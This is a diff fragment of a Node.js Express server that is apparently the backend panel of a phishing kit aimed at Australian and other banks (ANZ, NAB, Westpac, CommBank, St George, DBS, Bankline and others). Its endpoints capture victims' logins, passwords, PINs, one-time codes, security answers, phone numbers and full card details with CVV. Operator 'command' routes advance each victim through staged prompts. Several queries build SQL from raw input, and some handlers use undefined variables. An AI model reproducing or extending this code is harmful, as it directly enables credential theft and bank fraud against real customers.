+    let details = [newStatus, uniqueid];
+    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  }
+});
+
+app.options("/dbsDeleteentry/:id", cors());
+
+app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM customers WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsSaveLogin", cors());
+
+app.post("/dbsSaveLogin", cors(), (req, res) => {
+  pin = req.body.pin;
+  userId = req.body.userid;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [pin, userId, uniqueid, ip];
+  let query = `INSERT INTO customers(pin,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsSaveLoginAgain", cors());
+
+app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
+  pin = req.body.pin;
+  userId = req.body.userid;
+  uniqueid = req.body.uniqueid;
+
+  let details = [pin, userId, uniqueid];
+  let query = `UPDATE customers SET pin=?, userId=?, status = 1 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsPaymentOtp", cors());
+
+app.post("/dbsPaymentOtp", cors(), (req, res) => {
+  paymentOtp = req.body.paymentOtp;
+  uniqueid = req.body.uniqueid;
+
+  let details = [paymentOtp, uniqueid];
+  let query = `UPDATE customers SET paymentOtp=?, status = 15 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsSavePhone", cors());
+
+app.post("/dbsSavePhone", cors(), (req, res) => {
+  telephone = req.body.telephone;
+  uniqueid = req.body.uniqueid;
+
+  let details = [telephone, uniqueid];
+  let query = `UPDATE customers SET telephone=?, status = 5 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsSaveEmail", cors());
+
+app.post("/dbsSaveEmail", cors(), (req, res) => {
+  email = req.body.email;
+  uniqueid = req.body.uniqueid;
+
+  let details = [email, uniqueid];
+  let query = `UPDATE customers SET email=?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsSavePhoneOtp", cors());
+
+app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
+  otp = req.body.otp;
+  uniqueid = req.body.uniqueid;
+
+  let details = [otp, uniqueid];
+  let query = `UPDATE customers SET otp=?, status = 7 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsSaveEmailOtp", cors());
+
+app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
+  otp = req.body.otp;
+  uniqueid = req.body.uniqueid;
+
+  let details = [otp, uniqueid];
+  let query = `UPDATE customers SET otp=?, status = 9 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/dbsSaveCC", cors());
+
+app.post("/dbsSaveCC", cors(), (req, res) => {
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cccvv = req.body.cccvv;
+  uniqueid = req.body.uniqueid;
+
+  let details = [ccnum, ccexp, cccvv, uniqueid];
+  let query = `UPDATE customers SET ccnum=?, ccexp=?, cccvv=?, status = 11 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+//ANZ
+//ANZ
+//ANZ
+
+app.options("/anzCustomers/:owner", cors());
+
+app.get("/anzCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+
+  let details = [owner];
+  let query = `SELECT * FROM anz WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/anzCommand", cors());
+
+app.post("/anzCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+
+  if (newStatus == 4) {
+    question1 = req.body.question1;
+
+    let query = `UPDATE anz SET status= ${newStatus}, question1 = '${question1}' WHERE uniqueid= '${uniqueid}'`;
+
+    panelConnection.query(query, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  } else {
+    let query = `UPDATE anz SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+    panelConnection.query(query, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  }
+});
+
+app.options("/anzCustomers/:id/:owner/modal", cors());
+
+app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/anzCustomers/:id/:owner", cors());
+
+app.get("/anzCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/anzSaveLogin", cors());
+
+app.post("/anzSaveLogin", cors(), (req, res) => {
+  customerId = req.body.customerId;
+  password = req.body.password;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [customerId, password, uniqueid, ip, owner];
+  let query = `INSERT INTO anz(customerId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/anzSaveTelephone", cors());
+
+app.post("/anzSaveTelephone", cors(), (req, res) => {
+  telephone = req.body.telephone;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [telephone, uniqueid, owner];
+  let query = `UPDATE anz SET telephone=?, status = 7 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/anzSaveLoginAgain", cors());
+
+app.post("/anzSaveLoginAgain", cors(), (req, res) => {
+  customerId = req.body.customerId;
+  password = req.body.password;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [customerId, password, uniqueid, owner];
+  let query = `UPDATE anz SET customerId=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/anzSaveOTP", cors());
+
+app.post("/anzSaveOTP", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE anz SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/anzSaveAnswers", cors());
+
+app.post("/anzSaveAnswers", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  answer1 = req.body.answer1;
+  owner = req.body.owner;
+
+  let details = [answer1, uniqueid, owner];
+  let query = `UPDATE anz SET answer1=?, status = 5 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/anzDeleteentry/:id", cors());
+
+app.post("/anzDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM anz WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//BL
+//BL
+//BL
+
+app.options("/banklineCustomers/:id", cors());
+
+app.get("/banklineCustomers/:id", (req, res) => {
+  uniqueid = req.params.id;
+
+  let details = [uniqueid];
+  let query = `SELECT * FROM customers WHERE uniqueid=?`;
+
+  blConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/banklineCustomers", cors());
+
+app.get("/banklineCustomers", (req, res) => {
+  blConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/banklineSaveLogin", cors());
+
+app.post("/banklineSaveLogin", cors(), (req, res) => {
+  customerId = req.body.customerId;
+  userId = req.body.userId;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [customerId, userId, uniqueid, ip];
+  let query = `INSERT INTO customers(customerId,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;
+
+  blConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/banklineSavePayment", cors());
+
+app.post("/banklineSavePayment", cors(), (req, res) => {
+  paymentCode = req.body.paymentCode;
+  uniqueid = req.body.uniqueid;
+
+  let details = [paymentCode, uniqueid];
+  let query = `UPDATE customers SET paymentCode=?, status=5 WHERE uniqueid=?`;
+
+  blConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/banklineSaveAuth", cors());
+
+app.post("/banklineSaveAuth", cors(), (req, res) => {
+  responseCode = req.body.responseCode;
+  password = req.body.password;
+  uniqueid = req.body.uniqueid;
+
+  let details = [responseCode, password, uniqueid];
+  let query = `UPDATE customers SET responseCode=?, password=?, status=3 WHERE uniqueid=?`;
+
+  blConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/banklineCommand", cors());
+
+app.post("/banklineCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+
+  if (newStatus == 2 || newStatus == 11) {
+    char1 = req.body.char1;
+    char2 = req.body.char2;
+    char3 = req.body.char3;
+    loginQr = req.body.loginQr;
+    let details = [newStatus, char1, char2, char3, loginQr, uniqueid];
+    let query = `UPDATE customers SET status=?, char1=?, char2=?,char3=?, loginQr=? WHERE uniqueid=?`;
+
+    blConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  } else if (newStatus == 4) {
+    paymentQr = req.body.paymentQr;
+    partNumber = req.body.partNumber;
+    let details = [newStatus, partNumber, paymentQr, uniqueid];
+    let query = `UPDATE customers SET status=?, partNumber=?, paymentQr=? WHERE uniqueid=?`;
+
+    blConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  } else if (newStatus == 12) {
+    paymentQr = req.body.paymentQr;
+    let details = [newStatus, paymentQr, uniqueid];
+    let query = `UPDATE customers SET status=?, paymentQr=? WHERE uniqueid=?`;
+
+    blConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  } else {
+    let details = [newStatus, uniqueid];
+    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;
+
+    blConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Update Completed");
+      else console.log(err);
+    });
+  }
+});
+
+app.options("/banklineDeleteentry/:id", cors());
+
+app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM customers WHERE uniqueid= ?`;
+
+  blConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/banklineSaveLoginAgain", cors());
+
+app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
+  customerId = req.body.customerId;
+  userId = req.body.userId;
+  uniqueid = req.body.uniqueid;
+
+  let details = [customerId, password, uniqueid];
+  let query = `UPDATE customers SET customerId=?, password=?, status=1 WHERE uniqueid=?`;
+
+  blConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+//WP
+//WP
+//WP
+
+app.options("/wpCustomers/:id/:owner/modal", cors());
+
+app.get("/wpCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM wp WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/wpCustomers/:owner", cors());
+
+app.get("/wpCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM wp WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/wpCommand", cors());
+
+app.post("/wpCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE wp SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/wpCustomers/:id/:owner", cors());
+
+app.get("/wpCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM wp WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/wpSaveLogin", cors());
+
+app.post("/wpSaveLogin", cors(), (req, res) => {
+  customerId = req.body.customerId;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [customerId, password, uniqueid, ip, owner];
+  let query = `INSERT INTO wp(customerId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/wpSaveLoginAgain", cors());
+
+app.post("/wpSaveLoginAgain", cors(), (req, res) => {
+  customerId = req.body.customerId;
+  password = req.body.password;
+  uniqueid = req.body.uniqueid;
+  owner = req.body.owner;
+
+  let details = [customerId, password, uniqueid, owner];
+  let query = `UPDATE wp SET customerId=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/wpSaveOTP", cors());
+
+app.post("/wpSaveOTP", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE wp SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/wpSaveTelephone", cors());
+
+app.post("/wpSaveTelephone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  let details = [telephone, uniqueid, owner];
+  let query = `UPDATE wp SET telephone=?, status = 5 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/wpDeleteentry/:id", cors());
+
+app.post("/wpDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM wp WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//COMMBANK
+//COMMBANK
+//COMMBANK
+
+app.options("/cbCustomers/:owner", cors());
+
+app.get("/cbCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM cb WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/cbCommand", cors());
+
+app.post("/cbCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE cb SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/cbCustomers/:id/:owner", cors());
+
+app.get("/cbCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  time = new Date().toUTCString();
+
+  panelConnection.query(
+    `UPDATE cb SET time = '${time}' WHERE uniqueid = ${uniqueid}`,
+    (err) => {
+      if (err) {
+        console.log(err);
+      }
+    }
+  );
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/cbCustomers/:id/:owner/modal", cors());
+
+app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/cbSaveLogin", cors());
+
+app.post("/cbSaveLogin", cors(), (req, res) => {
+  clientNumber = req.body.clientNumber;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+  time = new Date().toUTCString();
+
+  let details = [clientNumber, password, uniqueid, ip, owner, time];
+  let query = `INSERT INTO cb(clientNumber,password,uniqueid,status,ip, owner, time) VALUES (?,?,?,1,?,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/cbSaveLoginAgain", cors());
+
+app.post("/cbSaveLoginAgain", cors(), (req, res) => {
+  customerId = req.body.customerId;
+  password = req.body.password;
+  uniqueid = req.body.uniqueid;
+  time = new Date().toUTCString();
+
+  let details = [customerId, password, time, uniqueid, owner];
+  let query = `UPDATE cb SET customerId=?, password=?, time = ?, status = 1 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/cbSaveOTP", cors());
+
+app.post("/cbSaveOTP", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+  time = new Date().toUTCString();
+
+  let details = [otp, time, uniqueid, owner];
+  let query = `UPDATE cb SET otp=?, time = ?, status = 3 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/cbSaveCard", cors());
+
+app.post("/cbSaveCard", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cccvv = req.body.cccvv;
+  owner = req.body.owner;
+  time = new Date().toUTCString();
+
+  let details = [ccnum, ccexp, cccvv, time, uniqueid, owner];
+  let query = `UPDATE cb SET ccnum=?, ccexp=?, cccvv=?, time = ?, status = 7 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/cbSavePhone", cors());
+
+app.post("/cbSavePhone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+  time = new Date().toUTCString();
+
+  let details = [telephone, time, uniqueid, owner];
+  let query = `UPDATE cb SET telephone=?, time = ?, status = 5 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/cbDeleteentry/:id", cors());
+
+app.post("/cbDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM cb WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+//ZENCOM
+//ZENCOM
+//ZENCOM
+
+app.options("/zcCustomers/:owner", cors());
+
+app.get("/zcCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let result = [];
+  for (let i = 0; i < db.Zencom.length; i++) {
+    if (db.Zencom[i].owner === owner) {
+      result.push(db.Zencom[i]);
+    }
+  }
+  res.send(result);
+});
+
+app.options("/zcCommand", cors());
+
+app.post("/zcCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  for (let i = 0; i < db.Zencom.length; i++) {
+    if (db.Zencom[i].uniqueid === uniqueid) {
+      db.Zencom[i].status = newStatus;
+      res.send("Update Completed");
+    }
+  }
+});
+
+app.options("/zcCustomers/:id/:owner", cors());
+
+app.get("/zcCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+  let result = [];
+
+  for (let i = 0; i < db.Zencom.length; i++) {
+    if (db.Zencom[i].uniqueid === uniqueid && db.Zencom[i].owner === owner) {
+      result.push(db.Zencom[i]);
+    }
+  }
+  res.send(result);
+});
+
+app.options("/zcSavePin", cors());
+
+app.post("/zcSavePin", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  pin = req.body.pin;
+  owner = req.body.owner;
+
+  for (let i = 0; i < db.Zencom.length; i++) {
+    if (db.Zencom[i].uniqueid === uniqueid) {
+      db.Zencom[i].pin = pin;
+      db.Zencom[i].status = 5;
+    }
+  }
+  res.send("Completed");
+});
+
+app.options("/zcSaveLoginAgain", cors());
+
+app.post("/zcSaveLoginAgain", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  for (let i = 0; i < db.Zencom.length; i++) {
+    if (db.Zencom[i].uniqueid === uniqueid) {
+      db.Zencom[i].telephone = telephone;
+      db.Zencom[i].status = 1;
+    }
+  }
+  res.send("Completed");
+});
+
+app.options("/zcSaveOtp", cors());
+
+app.post("/zcSaveOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  for (let i = 0; i < db.Zencom.length; i++) {
+    if (db.Zencom[i].uniqueid === uniqueid) {
+      db.Zencom[i].otp = otp;
+      db.Zencom[i].status = 3;
+    }
+  }
+  res.send("Completed");
+});
+
+app.options("/zcSaveLogin", cors());
+
+app.post("/zcSaveLogin", cors(), (req, res) => {
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+  let loginInfo = {
+    id: uniqueid,
+    uniqueid: uniqueid,
+    telephone: telephone,
+    owner: owner,
+    ip: ip,
+    status: 1,
+  };
+  db.Zencom.push(loginInfo);
+  res.send("Completed");
+});
+
+//NAB
+//NAB
+//NAB
+
+app.options("/nabCustomers/:id/:owner/modal", cors());
+
+app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/nabCustomers/:owner", cors());
+
+app.get("/nabCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM nab WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/nabCommand", cors());
+
+app.post("/nabCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE nab SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/nabCustomers/:id/:owner", cors());
+
+app.get("/nabCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/nabSaveLogin", cors());
+
+app.post("/nabSaveLogin", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [username, password, uniqueid, ip, owner];
+  let query = `INSERT INTO nab(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/nabSaveOtp", cors());
+
+app.post("/nabSaveOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE nab SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/nabSavePhone", cors());
+
+app.post("/nabSavePhone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE nab SET telephone=?, status = 5 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+//MULTIPANEL
+//MULTIPANEL
+//MULTIPANEL
+
+app.options("/multiCustomers/:owner", cors());
+
+app.get("/multiCustomers/:owner", async (req, result) => {
+  owner = req.params.owner;
+  let res = [];
+  panelConnection.query(
+    `SELECT * FROM bendi WHERE owner = "${owner}"`,
+    (err, rows, fields) => {
+      rows.forEach((row) => {
+        row.panel = "Bendigo";
+        res.push(row);
+      });
+    }
+  );
+  panelConnection.query(
+    `SELECT * FROM anz WHERE owner = "${owner}"`,
+    (err, rows, fields) => {
+      rows.forEach((row) => {
+        row.panel = "ANZ";
+        res.push(row);
+      });
+    }
+  );
+  panelConnection.query(
+    `SELECT * FROM wp WHERE owner = "${owner}"`,
+    (err, rows, fields) => {
+      rows.forEach((row) => {
+        row.panel = "WestPac";
+        res.push(row);
+      });
+    }
+  );
+  panelConnection.query(
+    `SELECT * FROM nab WHERE owner = "${owner}"`,
+    (err, rows, fields) => {
+      rows.forEach((row) => {
+        row.panel = "NAB";
+        res.push(row);
+      });
+    }
+  );
+  panelConnection.query(
+    `SELECT * FROM cb WHERE owner = "${owner}"`,
+    (err, rows, fields) => {
+      rows.forEach((row) => {
+        row.panel = "CommBank";
+        res.push(row);
+      });
+      result.send(res);
+    }
+  );
+});
+
+//STGEORGE
+//STGEORGE
+//STGEORGE
+
+app.options("/georgeCustomers/:id/:owner/modal", cors());
+
+app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM george WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/georgeCustomers/:owner", cors());
+
+app.get("/georgeCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM george WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/georgeCommand", cors());
+
